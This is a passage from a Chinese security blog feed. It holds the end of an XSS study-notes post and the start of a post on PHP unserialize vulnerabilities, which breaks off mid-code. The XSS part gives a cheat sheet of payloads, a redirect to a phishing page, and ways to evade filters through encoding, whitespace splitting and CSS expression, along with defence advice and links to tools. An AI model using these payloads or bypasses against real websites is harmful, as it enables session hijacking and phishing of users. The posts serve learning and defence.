class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure></li><li><p>通过javascript自动构造隐藏表单并提交(POST)</p></li><li>通过XMLHttpRequest直接发送一个POST请求</li></ul><p>&#160; &#160; &#160; &#160;我们可以通过构造的GET/POST请求来实现如添加管理员、删除文章、上传文件等操作。XSS蠕虫从某种意义上来说也属于会话劫持。</p><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>&#160; &#160; &#160; &#160;现在一般我们都可以很容易的防范钓鱼网站，可是当钓鱼网站与XSS漏洞结合呢？设想一下，如mail.qq.com的页面存在XSS漏洞，攻击者通过iframe替换了原来的页面成钓鱼页面，并且网页的Url还是原来的页面，你是否能察觉出来？</p><h4 id="XSS重定向钓鱼"><a href="#XSS重定向钓鱼" class="headerlink" title="XSS重定向钓鱼"></a>XSS重定向钓鱼</h4><p>&#160; &#160; &#160; &#160;即从<code>www.a.com</code>通过xss漏洞跳转到<code>www.b.com</code>的钓鱼页面上，整个过程变化明显，受害者易察觉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/index.php?search=&lt;script&gt;document.location.href=&quot;http://www.b.com/index.php&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h4 id="HTML注入式钓鱼"><a href="#HTML注入式钓鱼" class="headerlink" title="HTML注入式钓鱼"></a>HTML注入式钓鱼</h4><p>&#160; &#160; &#160; &#160;通过javascript来修改页面的DOM对象属性，或在原页面中添加新的DOM元素。前者相对于后者更隐蔽。</p><h4 id="Iframe"><a href="#Iframe" class="headerlink" title="Iframe"></a>Iframe</h4><p>&#160; &#160; &#160; &#160;攻击者通过javascript来添加一个新的<code>&lt;Iframe&gt;</code>标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。</p><h2 id="5-XSS漏洞的挖掘"><a href="#5-XSS漏洞的挖掘" class="headerlink" title="5) XSS漏洞的挖掘"></a>5) XSS漏洞的挖掘</h2><p>&#160; &#160; &#160; &#160;就目前而言，XSS漏洞的挖掘主要分为白盒审计和黑盒Fuzz两种。</p><h3 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h3><p>&#160; &#160; &#160; &#160;通过查看源代码来判断网站的交互点是否存在安全过滤。由于此处涉及代码审计内容(其实就是懒)，就细说，这里直接引用书中总结的。</p><blockquote><p>分析源代码挖掘XSS的一般思路是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤</p></blockquote><h3 id="黑盒审计"><a href="#黑盒审计" class="headerlink" title="黑盒审计"></a>黑盒审计</h3><p>&#160; &#160; &#160; &#160;这个可得好好说说了，毕竟我们在现实环境中挖掘XSS漏洞时黑盒的情况偏多。我们进行XSS黑盒测试时主要分为手工检测和工具检测。</p><h4 id="手工检测"><a href="#手工检测" class="headerlink" title="手工检测"></a>手工检测</h4><p>&#160; &#160; &#160; &#160;首先我们需要尽可能地找到目标的每个输入输出点并挨个尝试；在进行尝试的时候，我们应优先选择特殊字符进行测试，如<code>&quot;&lt;&gt;&amp;;/&#39;:</code>等，如果连<code>&lt;&gt;</code>都未过滤/转义，那么该输入点很可能存在XSS漏洞。<br>&#160; &#160; &#160; &#160;如果<code>&lt;&gt;</code>等标记符号都被过滤/转义了，我们也可以使用标签自身的属性/事件(href,lowsrc,bgsound,backgroud,value,action,dynsrc等)来触发XSS,如<br><code>&lt;input name=&quot;xx&quot; value=&lt;?=$query?&gt;&gt;</code>这里的$query属于动态内容，我们把他替换成恶意代码，最终的代码为<code>&lt;input name=&quot;xx&quot; value=xss onmouseover=evil_script&gt;</code>。<br>&#160; &#160; &#160; &#160;一般来说，针对输入框的黑盒测试可能存在反射型XSS，也可能存在存储型XSS，还有可能是DOM型，针对Url参数的黑盒测试绝大多数只存在反射型XSS或DOM型XSS。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">常见标签</span><br><span class="line">&lt;img&gt;标签</span><br><span class="line">利用方式1</span><br><span class="line">&lt;img src=javascript:alert(&quot;xss&quot;)&gt;</span><br><span class="line">&lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&gt;</span><br><span class="line">&lt;img scr=&quot;URL&quot; style=&apos;Xss:expression(alert(/xss));&apos;</span><br><span class="line">&lt;!--CSS标记xss--&gt;</span><br><span class="line">&lt;img STYLE=&quot;background-image:url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&apos;xss&apos;)&quot;)&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;img src=1 onmouseover=alert(&apos;xss&apos;)&gt;</span><br><span class="line">&lt;a&gt;标签</span><br><span class="line">标准格式</span><br><span class="line">&lt;a href=&quot;https://www.baidu.com&quot;&gt;baidu&lt;/a&gt;</span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;a href=&quot;javascript:alert(&apos;xss&apos;)&quot;&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:eval(alert(&apos;xss&apos;))&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br><span class="line">&lt;a href=&quot;&quot; onclick=alert(&apos;xss&apos;)&gt;aa&lt;/a&gt;</span><br><span class="line">利用方式3</span><br><span class="line">&lt;a href=&quot;&quot; onclick=eval(alert(&apos;xss&apos;))&gt;aa&lt;/a&gt;</span><br><span class="line">利用方式4</span><br><span class="line">&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&apos;xss&apos;) y=2016&gt;aa&lt;/a&gt;</span><br><span class="line">input标签</span><br><span class="line">标准格式</span><br><span class="line">&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;</span><br><span class="line">利用方式1</span><br><span class="line">&lt;input value=&quot;&quot; onclick=alert(&apos;xss&apos;) type=&quot;text&quot;&gt;</span><br><span class="line">利用方式2</span><br><span class="line">&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&apos;xss&apos;) bad=&quot;&quot;&gt;</span><br><span class="line">利用方式4</span><br><span class="line">&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br><span class="line">&lt;form&gt;标签</span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;form action=javascript:alert(&apos;xss&apos;) method=&quot;get&quot;&gt;</span><br><span class="line">&lt;form action=javascript:alert(&apos;xss&apos;)&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;form method=post action=aa.asp? onmouseover=prompt(&apos;xss&apos;)&gt;</span><br><span class="line">&lt;form method=post action=aa.asp? onmouseover=alert(&apos;xss&apos;)&gt;</span><br><span class="line">&lt;form action=1 onmouseover=alert(&apos;xss)&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br><span class="line">&lt;iframe&gt;标签</span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;);height=5width=1000 /&gt;&lt;iframe&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&apos;xss&apos;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&apos;xss&apos;) /&gt;&lt;iframe&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">svg&lt;&gt;标签</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">iframe</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p><p>——引自<strong>wkend</strong>的文章<a href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener">《XSS小节》</a></p><h4 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h4><p>&#160; &#160; &#160; &#160;关于XSS的自动检测软件有许多，如Burp的Scan模块，<a href="https://github.com/rajeshmajumdar/BruteXSS" target="_blank" rel="noopener">BruteXSS</a>等，这里不做过多解释。</p><h2 id="6-shellcode的绕过"><a href="#6-shellcode的绕过" class="headerlink" title="6) shellcode的绕过"></a>6) shellcode的绕过</h2><h3 id="绕过XSS-Filter"><a href="#绕过XSS-Filter" class="headerlink" title="绕过XSS-Filter"></a>绕过XSS-Filter</h3><p>&#160; &#160; &#160; &#160;XSS-Filter是一段基于黑名单的过滤函数，大多数CMS都有这么个函数，作用于用户的每一个输入点，用于过滤可能的恶意代码。不过从某种意义上来说，基于黑名单的保护是一定不会是安全的，由于XSS的多变性，几乎不可能存在完全地过滤。</p><h4 id="空格回车和Tab"><a href="#空格回车和Tab" class="headerlink" title="空格回车和Tab"></a>空格回车和Tab</h4><p>&#160; &#160; &#160; &#160;对XSS-Filter而言，如果仅仅是将函数加入黑名单处理，那么可以在函数名称之中尝试加入空格、回车、Tab等键位符来进行绕过。这是由于在javascript中只会将<code>;</code>作为语句的终止符，当浏览器引擎解析javascript脚本时没有匹配到<code>;</code>便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字<code>javascript|alert</code>的过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javasc</span><br><span class="line">ript:aler</span><br><span class="line">t(/xss/)&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/10/5c83f56052a54.png" alt="IE6下测试成功"></p><h4 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h4><p>&#160; &#160; &#160; &#160;HTML中属性值支持ASCII码形式，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>&#160; &#160; &#160; &#160;替换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascrip&amp;#116&amp;#58alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>&#160; &#160; &#160; &#160;其中在ASCII表中116为<code>t</code>，58为<code>:</code>。<br>&#160; &#160; &#160; &#160;也可以将<code>&amp;#01</code>,<code>&amp;#02</code>等插入javascript的头部，还可以将tab(&amp;#09)|换行符(&amp;#10)|回车键(&amp;#13)插入到代码中的任意位置。</p><h4 id="Fuzz标签未过滤事件名"><a href="#Fuzz标签未过滤事件名" class="headerlink" title="Fuzz标签未过滤事件名"></a>Fuzz标签未过滤事件名</h4><p>&#160; &#160; &#160; &#160;如<code>&lt;img src=x onerror=alert(/xss/)&gt;</code>其中的onerror即为IMG标签的一个事件，通常这样的事件都是以<code>on</code>开头，常见的有:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">onResume</span><br><span class="line">onReverse</span><br><span class="line">onSeek</span><br><span class="line">onSynchRestored</span><br><span class="line">onURLFlip</span><br><span class="line">onRepeat</span><br><span class="line">onPause</span><br><span class="line">onstop</span><br><span class="line">onmouseover</span><br></pre></td></tr></table></figure></p><p>&#160; &#160; &#160; &#160;除此之外还有很多事件可以利用，这里不再一一列举。</p><h4 id="使用Css绕过"><a href="#使用Css绕过" class="headerlink" title="使用Css绕过"></a>使用Css绕过</h4><p>&#160; &#160; &#160; &#160;利用Css样式表可以执行javascript的特性，如<br>&#160; &#160; &#160; &#160;Css直接执行javascript：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(javascript:alert(&apos;xss&apos;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;background-image:url(&quot;javascript:alert(&apos;xss&apos;)&quot;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p><p>&#160; &#160; &#160; &#160;css中使用expression执行javascript:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;width: expression(alert(&apos;xss&apos;))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;#&quot; style=&quot;xss:expression(alert(/xss/))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;background-image:expression(&quot;alert(&apos;xss&apos;)&quot;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p><p>&#160; &#160; &#160; &#160;在上述的两个例子中，都用到了样式表的url属性来执行XSS代码。<br>&#160; &#160; &#160; &#160;除了上述两种，还可以利用@import直接执行javascript代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    @import &apos;javascript:alert(&quot;xss&quot;)&apos;;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p><p>&#160; &#160; &#160; &#160;在现实环境下，HTML页面中的Css与Javascript的嵌入方式很相似，且Css也可以执行javascript代码，故我们的XSS代码也可以通过嵌入远程恶意css文件来进行XSS攻击。</p><h3 id="扰乱规则"><a href="#扰乱规则" class="headerlink" title="扰乱规则"></a>扰乱规则</h3><ul><li>大小写变换;</li><li>利用expression执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则;</li><li>结合样式表注释字符/**/，通过css执行javascript</li><li>样式标签会过滤<code>\</code>和<code>\0</code>，可以构造如<code>@i\mp\0\0ort &#39;jav\0asc\0rip\t:al\0er\t(&quot;x\0ss&quot;)&#39;</code>绕过</li><li>Css关键字进行编码处理，如<code>&lt;p style=&quot;xss:\0065xpression(alert(/xss/))&quot;&gt;</code>其中65为字母e进行unicode编码后的数字部分</li><li>利用浏览器解析注释的问题</li></ul><h3 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h3><p>&#160; &#160; &#160; &#160;javascript支持许多的编码格式，如：</p><ul><li>unicode</li><li>escapes</li><li>十六|十|八进制  </li></ul><p><strong>如果能将这些编码格式运用进跨站攻击，无意能大大加强XSS的威力</strong><br>在IE下甚至支持JScript Encode加密后的代码</p><h3 id="拆分法"><a href="#拆分法" class="headerlink" title="拆分法"></a>拆分法</h3><p>&#160; &#160; &#160; &#160;如果一个网站规定了输入的最大长度，但是ShellCode又太长，那么久可以拆分成几个部分，最后在组成起来。相关文章：<a href="http://www.5ilog.com/cgi-bin/sys/link/view.aspx/7016111.htm" target="_blank" rel="noopener">《疯狂的跨站之行》剑心(非原链接)</a></p><h2 id="7-XSS防御"><a href="#7-XSS防御" class="headerlink" title="7) XSS防御"></a>7) XSS防御</h2><p>&#160; &#160; &#160; &#160;说了那么多，那我们该如何防御这看似防不胜防的XSS攻击呢？</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>&#160; &#160; &#160; &#160;严格控制用户可输入的范围，如手机号只能输入数字且长度不能大于11位等，如需输入某些敏感字符的情况下可对数据进行转义处理，对于用户数据的过滤尽可能地采用白名单而不是黑名单。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>&#160; &#160; &#160; &#160;减少不必要的输出，在需要输出的地方使用HTML编码将敏感字符转义为实体符，javascript进行DOM操作时注意不要将已转义的实体符再次解析成DOM对象。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>&#160; &#160; &#160; &#160;设置HttpOnly，开启WAF。</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>&#160; &#160; &#160; &#160;感谢参考资料中各位分享技术的大牛，小弟才笔有限，仅仅介绍了XSS攻击中的一部分，仍有一部分由于种种原因我没有写进来。比如整篇文章都是Javascript，实际上在遇到XSS问题时我们还需考虑VBscript、Actionscript等等，还有许多优秀的案例由于篇幅问题无法写上了，可能会导致部分读者理解不全面，在这里向大家说声抱歉，我会在下面的参考中列出我参考的书籍与文章供各位读者查看。XSS的学习暂时放下了，下一站——SQL注入，虽然对此有些浅显的认知，但还是希望能系统的学一遍，可能会在下个月发出来，感兴趣的读者可以关注我的博客(<a href="http://www.0x002.com)。">www.0x002.com)。</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><strong><br>书籍：<br>《Web前端黑客技术揭秘》<br>《XSS跨站脚本攻击剖析与防御》<br>《白帽子讲Web安全》<br>《黑客攻防技术宝典Web实战篇》第二版<br>文章：</strong><br><a href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener">XSS小结</a><br><a href="https://github.com/dwqs/blog/issues/68" target="_blank" rel="noopener">浅说 XSS 和 CSRF</a><br><a href="https://blog.csdn.net/h_mxc/article/details/50542038" target="_blank" rel="noopener">Session攻击手段(会话劫持/固定)及其安全防御措施</a>  </p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><a href="https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md" target="_blank" rel="noopener">https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md</a>  2017灰袍技能精华<br><a href="https://github.com/rajeshmajumdar/BruteXSS" target="_blank" rel="noopener">https://github.com/rajeshmajumdar/BruteXSS</a> BruteXSS<br><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a> Beef神器<br><a href="https://github.com/1N3/XSSTracer" target="_blank" rel="noopener">https://github.com/1N3/XSSTracer</a> 用于检查跨站点跟踪的小型python脚本<br><a href="https://github.com/0x584A/fuzzXssPHP" target="_blank" rel="noopener">https://github.com/0x584A/fuzzXssPHP</a> 一个非常简单的反射XSS扫描仪支持GET/POST<br><a href="https://github.com/chuhades/xss_scan" target="_blank" rel="noopener">https://github.com/chuhades/xss_scan</a> 反射xss扫描器<br><a href="https://github.com/BlackHole1/autoFindXssAndCsrf" target="_blank" rel="noopener">https://github.com/BlackHole1/autoFindXssAndCsrf</a> 浏览器的插件，它自动检查页面是否具有xss和漏洞<br><a href="https://github.com/shogunlab/shuriken" target="_blank" rel="noopener">https://github.com/shogunlab/shuriken</a> xss命令行工具用于测试web应用程序中xss负载列表<br><a href="https://github.com/UltimateHackers/XSStrike" target="_blank" rel="noopener">https://github.com/UltimateHackers/XSStrike</a> 用于XSS、WAF检测和旁路的模糊和蛮力参数<br><a href="https://github.com/stamparm/DSXS" target="_blank" rel="noopener">https://github.com/stamparm/DSXS</a> 一个完全功能的跨站点脚本漏洞扫描器，支持获取和发布参数，并写入100行代码  </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简单概述&quot;&gt;&lt;a href=&quot;#简单概述&quot; class=&quot;headerlink&quot; title=&quot;简单概述&quot;&gt;&lt;/a&gt;简单概述&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&lt;br&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com)
&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="原创栏目" scheme="http://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="XSS" scheme="http://www.0x002.com/tags/XSS/"/>
    
      <category term="web安全" scheme="http://www.0x002.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞的简单学习</title>
    <link href="http://www.0x002.com/2018/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.0x002.com/2018/PHP反序列漏洞的简单学习/</id>
    <published>2018-10-08T02:52:15.000Z</published>
    <updated>2018-11-16T13:46:58.061Z</updated>
    
    <content type="html"><![CDATA[<p>在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。<br><a id="more"></a></p><h1 id="PHP序列化与反序列化"><a href="#PHP序列化与反序列化" class="headerlink" title="PHP序列化与反序列化"></a>PHP序列化与反序列化</h1><p>谈到PHP序列化与反序列化<br>那么必须涉及到两个函数<code>serialize()</code>与<code>unserialize()</code><br>前者是将一个对象进行序列化后者是其反过程</p><h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h2><p>先来看看此函数的解释<br><img src="https://i.loli.net/2018/10/28/5bd4934800039.png" alt=""><br>函数返回的是一串字符串，可以对如数组和对象进行序列化处理<br>下面给出两个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php //对数组进行序列化</span><br><span class="line">$a = array(&apos;a&apos; =&gt; &apos;Apple&apos; ,&apos;b&apos; =&gt; &apos;banana&apos; , &apos;c&apos; =&gt; &apos;Coconut&apos;);</span><br><span class="line">//序列化数组</span><br><span class="line">$s = serialize($a);</span><br><span class="line">echo $s;</span><br><span class="line">//输出结果：a:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Apple&quot;;s:1:&quot;b&quot;;s:6:&quot;banana&quot;;s:1:&quot;c&quot;;s:7:&quot;Coconut&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class name1 &#123;</span><br><span class="line">    var $test1;</span><br><span class="line">    var $test2;</span><br><span class="line">&#125;</span><br><span class="line">$test3 = new name1;</span><br><span class="line">$test3-&gt;test1 = &apos;hack &apos;;</span><br><span class="line">$test3-&gt;test2 = &apos;fun&apos;;</span><br><span class="line">echo serialize($test3); </span><br><span class="line">//输出结果：O:5:&quot;name1&quot;:2:&#123;s:5:&quot;test1&quot;;s:5:&quot;hack &quot;;s:5:&quot;test2&quot;;s:3:&quot;fun&quot;;&#125;</span><br></pre></td></tr></table></figure><p>对于序列化后得到的字符串解释如图<br><img src="https://i.loli.net/2018/10/28/5bd496e29a917.png" alt=""></p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h2><p>将已序列化的字符串进行反序列，即恢复序列化前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class name1 &#123;</span><br><span class="line">    var $test1;</span><br><span class="line">    var $test2;</span><br><span class="line">&#125;</span><br><span class="line">$str = &apos;O:5:&quot;name1&quot;:2:&#123;s:5:&quot;test1&quot;;s:5:&quot;hack &quot;;s:5:&quot;test2&quot;;s:3:&quot;fun&quot;;&#125;&apos;;</span><br><span class="line">$ser = unserialize($str);</span><br><span class="line">print_r($ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/10/28/5bd4985a10303.png" alt=""></p><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>看似安全的序列化其实存在漏洞，而且一旦能利用就一般危害不小，在代码审计中我们需要格外注意此类型漏洞。<br>序列化漏洞常见的魔法函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">construct():当一个类被创建时自动调用</span><br><span class="line">destruct():当一个类被销毁时自动调用</span><br><span class="line">invoke():当把一个类当作函数使用时自动调用</span><br><span class="line">tostring():当把一个类当作字符串使用时自动调用</span><br><span class="line">wakeup():当调用unserialize()函数时自动调用</span><br><span class="line">sleep():当调用serialize()函数时自动调用</span><br><span class="line">__call():当要调用的方法不存在或权限不足时自动调用</span><br></pre></td></tr></table></figure><hr><p>简单测试如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class chybeta&#123;</span><br><span class="line">var $test = &apos;123&apos;;</span><br><span class="line">function __wakeup()&#123;</span><br><span class="line">echo &quot;__wakeup&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function __construct()&#123;</span><br><span class="line">echo &quot;__construct&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function __destruct()&#123;</span><br><span class="line">echo &quot;__destruct&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class2 = &apos;O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;&apos;;</span><br><span class="line">print_r($class2);</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">$class2_unser = 